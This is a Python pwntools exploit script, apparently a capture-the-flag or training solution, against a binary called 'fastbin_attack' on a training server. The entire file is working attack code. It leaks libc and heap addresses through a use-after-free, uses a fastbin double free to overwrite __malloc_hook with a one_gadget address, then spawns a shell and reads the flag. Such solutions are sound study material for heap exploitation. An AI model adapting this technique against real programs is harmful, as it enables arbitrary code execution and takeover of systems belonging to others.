from pwn import *
import sys
import time

context.arch = 'amd64'

if(len(sys.argv) > 1):
    if(sys.argv[1] == '--debug'):
        p = process("./fastbin_attack")
        gdb.attach(p, """
        b *main+237
        b *main+104
        """ )
        input("wait...")
    elif(sys.argv[1] == '--strace'):
        p = process(["strace", "./fastbin_attack"])
    elif(sys.argv[1] == '--remote'):
        p = remote("bin.training.offdef.it", 10101)
else:
    p = process("./fastbin_attack")

libc = ELF("./libc-2.23.so")

def malloc(size):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"Size: ")
    p.sendline(b"%d" % size)
    p.recvuntil(b"Allocated at index ")
    return int(p.recvuntil(b"!")[:-1])

def terminator_malloc(size):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"Size: ")
    p.sendline(b"%d" % size)


def write(index, data):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b"Index: ")
    p.sendline(b"%d" % index)
    p.recvuntil(b"Content: ")
    p.send(data)
    p.recvuntil(b"Done!")

def read(index):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b"Index: ")
    p.sendline(b"%d" % index)
    return p.recvuntil(b"\nOptions:")[:-len("\nOptions:")]

def free(index):
    p.recvuntil(b"> ")
    p.sendline(b"4")
    p.recvuntil(b"Index: ")
    p.sendline(b"%d" % index)

def quit():
    p.recvuntil(b"> ")
    p.sendline(b"5")

## Leaks

a = malloc(0x300)
b = malloc(0x300)
free(a)

leak_libc = u64(read(a) + b"\x00\x00")

libc.address = leak_libc - 0x3C4B78

a = malloc(0x60)
b = malloc(0x60)
c = malloc(0x60)
free(b)
free(c)

leak_heap = u64(read(c) + b"\x00\x00") - 0x70

print("[!] leak heap: %#x" % leak_heap)
print("[!] leak libc: %#x" % leak_libc)
print("[!] libc: %#x" % libc.address)
print("[!] __malloc_hook: %#x" % libc.symbols.__malloc_hook)
print("[!] __free_hook: %#x" % libc.symbols.__free_hook)
print("[!] /bin/sh: %#x" % next(libc.search(b"/bin/sh\x00")))
one_gadget = 0xf1247 # 0x45226 0x4527a 0xf03a4 0xf1247
print("[!] one_gadget: %#x" % (libc.address + one_gadget))

## OVERWRITE HOOKS

size = 0x60

a = malloc(size)
b = malloc(size)

free(a)
free(b)
free(a)

a = malloc(size)
write(a, p64(libc.symbols.__malloc_hook - 0x23))

# Free Hook cannot be used because there are no useful metadata before it in the memory

b = malloc(size)

a = malloc(size)

hook = malloc(size)

## Malloc Hook cannot be used because the size is checked to be < 4096 !!
#write(hook, b"A"*(0x23 - 0x10) + p64(libc.symbols.system))
#terminator_malloc(next(libc.search(b"/bin/sh\x00")))

## With One Gadget
write(hook, b"A"*(0x23 - 0x10) + p64(libc.address + one_gadget))
terminator_malloc(size)

time.sleep(1)
p.sendline(b"cat flag")
print('\n', str(p.recv(), 'utf-8'))

p.interactive()